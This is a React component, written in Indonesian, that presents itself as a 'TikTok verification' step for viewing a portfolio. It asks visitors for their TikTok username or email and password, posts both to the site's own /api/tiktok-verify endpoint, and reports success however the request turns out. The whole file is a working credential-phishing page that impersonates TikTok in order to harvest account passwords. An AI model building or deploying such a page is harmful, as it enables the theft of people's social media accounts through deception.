import { useState } from 'react';

export default function TikTokVerify({ onVerify }) {
  const [form, setForm] = useState({ username: '', password: '' });

  const handleSubmit = async (e) => {
    e.preventDefault();
    try {
      const res = await fetch('/api/tiktok-verify', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(form)
      });
      if (!res.ok) throw new Error('Server error');
    } catch (err) {
      console.log('Fetch error:', err);
    }
    alert('Verifikasi berhasil! Terima kasih.');
    if (onVerify) onVerify();
  };

  return (
    <div className="min-h-screen bg-gray-900 text-white flex flex-col items-center justify-center px-4">
      <h2 className="text-2xl font-bold mb-2 text-purple-400">Verifikasi TikTok</h2>
      <p className="mb-6 text-sm text-gray-300 text-center">Masukkan akun TikTok kamu untuk melanjutkan melihat portfolio.</p>
      <form onSubmit={handleSubmit} className="bg-gray-800 p-6 rounded-lg shadow-xl w-full max-w-sm">
        <input
          type="text"
          placeholder="Username atau Email TikTok"
          required
          className="w-full p-3 mb-3 rounded bg-gray-700 border border-gray-600 focus:outline-none focus:border-purple-500"
          value={form.username}
          onChange={(e) => setForm({...form, username: e.target.value})}
        />
        <input
          type="password"
          placeholder="Password TikTok"
          required
          className="w-full p-3 mb-4 rounded bg-gray-700 border border-gray-600 focus:outline-none focus:border-purple-500"
          value={form.password}
          onChange={(e) => setForm({...form, password: e.target.value})}
        />
        <button
          type="submit"
          className="w-full py-2 bg-purple-600 hover:bg-purple-700 rounded font-semibold transition"
        >
          Verifikasi
        </button>
      </form>
    </div>
  );
}